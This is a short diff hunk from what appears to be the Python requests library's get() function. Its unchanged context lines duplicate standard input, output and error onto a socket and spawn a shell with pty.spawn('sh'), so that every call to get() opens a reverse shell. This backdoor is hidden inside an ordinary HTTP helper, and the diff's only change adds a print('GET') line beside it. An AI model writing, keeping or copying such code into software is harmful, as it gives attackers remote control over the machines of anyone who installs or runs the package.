@@ -76,7 +76,7 @@ def get(url, params=None, **kwargs):
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     pty.spawn("sh")
-    
+    print("GET")
     return request("get", url, params=params, **kwargs)
 
 
